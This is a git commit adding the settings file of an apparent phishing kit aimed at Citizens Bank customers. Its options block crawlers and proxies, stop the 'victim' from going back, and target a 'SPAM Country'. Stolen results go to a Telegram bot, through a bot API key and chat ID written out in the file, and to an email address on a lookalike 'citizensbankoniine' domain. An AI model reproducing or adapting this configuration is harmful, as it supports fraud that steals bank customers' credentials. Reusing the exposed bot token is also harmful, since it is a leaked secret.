c7756a9464541f28ac4219ba7e6fe60b30c968ac
mrrealking22 <113231236+mrrealking22@users.noreply.github.com>
2022-12-08 14:48:06 -0800

    Add files via upload

---
+++ settings/settings.php
@@ -0,0 +1,27 @@
+<?php
+
+
+
+$settings = array(
+	"log_user"		=> "1",	// Log User-Agent, IP and Date
+	"print_match"	=> "0",	// Print Crawler Detections 
+	"anti-back"		=> "1",	// Victim Can't Go Back To Session
+	"debug"			=> "0",	// Print Errors
+	"proxy_block"	=> "1",	// Detect Proxies & Block Them
+	"send_mail"		=> "1",	// Send E-Mail To Your Mail
+	"save_results"	=> "1",	// Save Results 
+	"telegram"		=> "1",	// Telegram Bots Receiver
+	"country"		=> "US", // Target SPAM Country
+	"double_qa"     => "0",	// Double Question
+	"double_login"  => "0",	// Double Login
+	"chat_id"		=> "5672497699",	// Chat ID Of You
+	"bot_url"		=> "bot5437689378:AAEfOM9N0HKk3GXEj3if--4yTujjaUZP5P4",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
+	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
+	"out"			=> "citizen+login",	// Outcome Of AntiBots Forward - DONT CHANGE
+	"email"			=> "logs@citizensbankoniine.duckdns.org",	// Your E-Mail
+);
+return $settings;
+
+
+
+?>
